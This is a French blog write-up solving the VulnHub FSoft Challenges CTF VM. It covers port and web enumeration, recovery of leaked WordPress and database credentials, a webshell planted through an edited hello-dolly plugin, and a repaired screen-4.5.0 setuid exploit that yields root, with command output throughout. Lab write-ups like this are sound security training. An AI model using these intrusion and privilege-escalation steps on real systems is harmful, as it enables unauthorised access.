# Solution du CTF FSoft Challenges VM de VulnHub

[FSoft Challenges VM](https://www.vulnhub.com/entry/fsoft-challenges-vm-1,402/) est un CTF créé par *Akasafe Team*. Il est disponible sur VulnHub soit au format OVA soit au format VMDF.

J'ai utilisé la version OVA sur VirtualBox et j'ai eu quelques déboires pour faire fonctionner la VM. J'ai d'abord commencé par la déclarer plus spécifiquement le système (qui est une Debian 10 de  64 bits) et j'ai du éditer l'entrée GRUB pour shunter l'authentification et rajouter un compte privilégié.

Ce compte m'a permis alors après un reboot de me connecter et de lancer simplement la commande `dhclient` pour que la VM obtienne bien une adresse IP.

A part ça le CTF a quelques impasses au début et l'exploitation finale requiert quelques manipulations pour faire fonctionner un exploit.

```
Nmap scan report for 192.168.56.71
Host is up (0.00023s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 37bc28a83aa599211753cb43da0dd035 (RSA)
|   256 97005692d42551340d54f7a048983502 (ECDSA)
|_  256 8632965c443484b631acc1042260620f (ED25519)
53/tcp   open  domain      ISC BIND 9.11.5-P4-5.1 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1-Debian
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: [Hacking] Fsoft Challenges
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
8314/tcp open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: [Hacking] Fsoft Challenges
MAC Address: 08:00:27:19:7A:1D (Oracle VirtualBox virtual NIC)
Service Info: Host: FSOFT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h39m58s, deviation: 2h53m12s, median: 59m58s
| smb2-time: 
|   date: 2022-12-03T11:48:22
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FSOFT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: fsoft
|   NetBIOS computer name: FSOFT\x00
|   Domain name: \x00
|   FQDN: fsoft
|_  System time: 2022-12-03T06:48:22-05:00
```

## Backup day

Je n'ai rien obtenu avec la Samba :

```shellsession
$ smbclient -U "" -N -L //192.168.56.71

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
```

J'ai procédé à une énumération sur le premier serveur web sur le port 80 :

```shellsession
$ feroxbuster -u http://192.168.56.71/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.71/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      315c http://192.168.56.71/images
301        9l       28w      315c http://192.168.56.71/backup
301        9l       28w      315c http://192.168.56.71/assets
301        9l       28w      315c http://192.168.56.71/manual
301        9l       28w      318c http://192.168.56.71/locations
301        9l       28w      316c http://192.168.56.71/install
301        9l       28w      313c http://192.168.56.71/blog
403        9l       28w      278c http://192.168.56.71/server-status
200       48l      121w     1268c http://192.168.56.71/
301        9l       28w      319c http://192.168.56.71/prototypes
[####################] - 15s    62260/62260   0s      found:10      errors:0      
[####################] - 15s    62260/62260   3958/s  http://192.168.56.71/
```

Si j'énumère les fichiers je trouve auss un `robots.txt` que Nmap n'a pas remonté car malformé (il n'y a pas d'entrées `disallow`). Le contenu est le suivant :

```
/backup
/images
/blog
/jenky
/data
/assets
/install
/prototypes
/locations
/choose1
```

Déjà dans `/assets` on trouve un `adminer.php` qui est grosso-modo un `phpMyAdmin` qui tient sur un fichier unique (c'est une vrai appli, par un script custom).

Sous `/blog` on trouve un Wordpress configuré pour fonctionner avec le nom de domaine `fsoft.hacking`. J'ai lancé `wpscan` pour chercher d'éventuels plugins intéressants :

```shellsession
$ docker run --add-host fsoft.hacking:192.168.56.71 -it --rm wpscanteam/wpscan --url http://fsoft.hacking/blog/ -e ap,at,cb,dbe --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

--- snip ---

[+] WordPress version 5.4 identified (Insecure, released on 2020-03-31).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://fsoft.hacking/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://fsoft.hacking/blog/, Match: 'WordPress 5.4'

--- snip ---

[+] hello-dolly
 | Location: http://fsoft.hacking/blog/wp-content/plugins/hello-dolly/
 | Latest Version: 1.7.2
 | Last Updated: 2022-10-31T04:17:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://fsoft.hacking/blog/wp-content/plugins/hello-dolly/, status: 200
 |
 | The version could not be determined.

--- snip ---

[i] Config Backup(s) Identified:

[!] http://fsoft.hacking/blog/wp-config.php.bak
 | Found By: Direct Access (Aggressive Detection)
```

Le scan a permis d'identifier le plugin hello-dolly qui n'est pas vulnérable mais il aura son importance toute à l'heure.

Surtout on découvre un fichier de backup de la configuration Wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'blogs' );

/** MySQL database username */
define( 'DB_USER', 'fs0ft' );

/** MySQL database password */
define( 'DB_PASSWORD', 'fs0ft@1234@#!@' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Je teste les identifiants sur le `adminer` mais ils sont refusés.

Sous le dossier `/backup` se trouve un fichier `shadow.bak` avec des hashs :

```
root:$6$Vecr/cwrJdZ1QPJ5$DdI9uFehxdWSZYHtuY3ymlOR.F8iHBA25wxgBASpNA9IxwQ8/KmqRUH1TMiKR9y4q234szzo0.UaHdn9YbG720:18223:0:99999:7:::
--- snip ---
fsoft:$6$jxlMs60rp44NJWvf$b30I/W4R/NA8NcSSXF2CmpgXUshZbp7RcYSH0y6DorzH0vYMuIJqB23N4lxvLw1kyD29ytMJhwYza0cEcaDhN.:18223:0:99999:7:::
```

Après les avoir passé à JohnTheRipper ça semble être une autre impasse.

Je suis alors allé énumérer le Nginx sur le port 8314 et j'ai trouvé un fichier :

`301        7l       12w      185c http://fsoft.hacking:8314/backup2`

Celui ci aussi contient une configuration Wordpress :

```php
/** The name of the database for WordPress */                                                                          
define( 'DB_NAME', 'wordpress_db' );                                                                                   

/** MySQL database username */                                                                                         
define( 'DB_USER', 'wordpress_user' );                                                                                 

/** MySQL database password */                                                                                         
define( 'DB_PASSWORD', '3b72186be8360b30c16625df95509b22acba1' );
```

Mais cette fois ça fonctionne sur le `adminer` :)

Dans la base de données Wordpress je trouve une table inhabituelle nommée `wp_cracked` et qui contient l'identifiant `fs0ft` / `fs0f@2020!@`.

Ce couple utilisateur / mot de passe permet de se connecter sur le Wordpress. L'utilisateur semble être administrateur puisqu'il est possible d'éditer les fichiers de thèmes.

J'ai fait le tour des différents thèmes sans trouver de fichiers modifiables (les permissions sur le système de fichier sont insufisantes). Finalement j'ai pu éditer un fichier du plugin `hello-dolly` (`hello-dolly/hello.php`) ce qui m'a permis d'obtenir ma RCE :

`/blog/wp-content/plugins/hello-dolly/hello.php?cmd=id`

## vim exploit.sh

LinPEAS repère rapidement un binaire setuid inhabituel :

`-rwsr-xr-x 1 root root 1.7M Nov 24  2019 /usr/bin/screen-4.5.0 (Unknown SUID binary)`

On est exactement sur le même scénario que pour le CTF [Nully Cybersecurity](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Nully%20Cybersecurity%20de%20VulnHub.md).

On s'empresse de récupérer l'exploit pour cette version de screen mais ça cafouille :

```shellsession
www-data@fsoft:/tmp$ ./screen_exploit.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function 'dropshell':
/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod'; did you mean 'chroot'? [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
     chroot
collect2: fatal error: cannot find 'ld'
compilation terminated.
/tmp/rootshell.c: In function 'main':
/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
     setbuf
/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
collect2: fatal error: cannot find 'ld'
compilation terminated.
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '/tmp/libhax.so' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
No Sockets found in /run/screen/S-www-data.

./screen_exploit.sh: line 42: /tmp/rootshell: No such file or directory
```

Apparemment le compilateur ne trouve pas le linker :

`collect2: fatal error: cannot find 'ld'`

En fouillant on voit qu'il y a comme un sac de noeud dû au fait que `ld` est un lien symbolique vers un chemin relatif et non absolu. J'ai réglé ça en copiant la cible du lien dans le dossier courant et en l'ajoutant à mon PATH :

```shellsession
www-data@fsoft:/tmp$ ls -al /usr/bin/ld
lrwxrwxrwx 1 root root 19 Mar 21  2019 /usr/bin/ld -> x86_64-linux-gnu-ld
www-data@fsoft:/tmp$ ls /usr/bin/x86_64-linux-gnu-ld
lrwxrwxrwx 1 root root 23 Mar 21  2019 /usr/bin/x86_64-linux-gnu-ld -> x86_64-linux-gnu-ld.bfd
www-data@fsoft:/tmp$ ls /usr/bin/x86_64-linux-gnu-ld.bfd 
-rwxr-xr-x 1 root root 1.8M Mar 21  2019 /usr/bin/x86_64-linux-gnu-ld.bfd
www-data@fsoft:/tmp$ cp /usr/bin/x86_64-linux-gnu-ld.bfd /tmp/
www-data@fsoft:/tmp$ export PATH=/tmp:$PATH
```

Ensuite on a une erreur de compilation car `execvp` a besoin de 2 arguments et là le code en donne 3 :

```
[+] First, we create our shell and library...
/tmp/rootshell.c: In function 'main':
/tmp/rootshell.c:9:5: error: too many arguments to function 'execvp'
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
In file included from /tmp/rootshell.c:2:
/usr/include/unistd.h:578:12: note: declared here
 extern int execvp (const char *__file, char *const __argv[])
            ^~~~~~
```

C'est étonnant que sur le précédent CTF similaire la compilation ait fonctionné. J'ai résolu le problème en replaçant `execvp` par `execvpe` qui prend effectivement l'environnement en troisième paramètre. J'ai aussi rajouté quelques `#include` histoire que les warnings disparaissent.

```shellsession
www-data@fsoft:/tmp$ ./screen_exploit.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-www-data.

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
root.txt
# cat root.txt
You are the winner !
```

On a finalement quelque chose qui fonctionne :)

*Publié le 4 décembre 2022*